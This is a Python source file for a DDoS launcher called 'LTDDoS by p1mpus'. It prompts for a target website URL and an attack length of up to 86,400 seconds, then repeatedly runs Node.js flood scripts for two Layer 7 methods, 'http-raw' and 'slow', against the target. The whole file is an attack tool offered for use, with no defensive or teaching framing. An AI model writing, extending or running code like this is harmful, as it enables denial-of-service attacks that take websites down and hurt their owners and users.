import requests
import os
import sys
from time import time
import ctypes

ctypes.windll.kernel32.SetConsoleTitleW('LTDDoS by p1mpus')
cwd = os.getcwd()
fos = sys.platform

def resource_path(relative_path):
    try:
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")

    return os.path.join(base_path, relative_path)

icon = resource_path("1.ico")
flog = resource_path("log.txt")

fhttpraw = resource_path('scripts/HTTP-RAW.js')
fslow = resource_path("scripts/slow.js")

def VPN():
    print("""
██╗░░░░░████████╗██████╗░██████╗░░█████╗░░██████╗
██║░░░░░╚══██╔══╝██╔══██╗██╔══██╗██╔══██╗██╔════╝
██║░░░░░░░░██║░░░██║░░██║██║░░██║██║░░██║╚█████╗░
██║░░░░░░░░██║░░░██║░░██║██║░░██║██║░░██║░╚═══██╗
███████╗░░░██║░░░██████╔╝██████╔╝╚█████╔╝██████╔╝
╚══════╝░░░╚═╝░░░╚═════╝░╚═════╝░░╚════╝░╚═════╝░

###################
# coded by p1mpus #
###################
""")
    
    if (fos == 'linux'):
        response = requests.get('http://icanhazip.com/')
        print("Your IP: " + response.text)
    elif (fos == 'win32'):
        response = requests.get('http://icanhazip.com/')
        print("Your IP: " + response.text)
        main()

def main():
    global url
    url = input("Write site URL: ")
	
    global wtime
    stime = input("Write attack time (seconds) [24 hours - 86400]: ")
    wtime = int(stime)
	
    print('''
LAYER 7
-------
[1] http-raw
[2] slow
	''')
    methods = input('Choose method: ')
	
    if (methods == '1'):
        httpraw()
    elif (methods == '2'):
        slow()
    else:
        print('ERROR!')
        main()

def httpraw():
    meth = 'HTTP-RAW'
    start = time()
    if (fos == 'linux'):
        while time() - start < wtime:
            print(f'\nAttack Started to {url} with {meth} method!\n[Press CTRL+C to stop]')
            os.system(f'node --max-old-space-size=4096 {cwd}/scripts/HTTP-RAW.js {url} {wtime} > /dev/null')
    elif (fos == 'win32'):
        while time() - start < wtime:
            print(f'\nAttack Started to {url} with {meth} method!\n[Press CTRL+C to stop]')
            os.system(f'node --max-old-space-size=4096 {fhttpraw} {url} {wtime} > {flog}')
    VPN()
  
def slow():
    meth = 'SLOW'
    start = time()
    if (fos == 'linux'):
        while time() - start < wtime:
            print(f'\nAttack Started to {url} with {meth} method!\n[Press CTRL+C to stop]')
            os.system(f'node --max-old-space-size=4096 {cwd}/scripts/slow.js {url} {wtime} > /dev/null')
    elif (fos == 'win32'):
        while time() - start < wtime:
            print(f'\nAttack Started to {url} with {meth} method!\n[Press CTRL+C to stop]')
            os.system(f'node --max-old-space-size=4096 {fslow} {url} {wtime} > {flog}')
    VPN()
	
VPN()
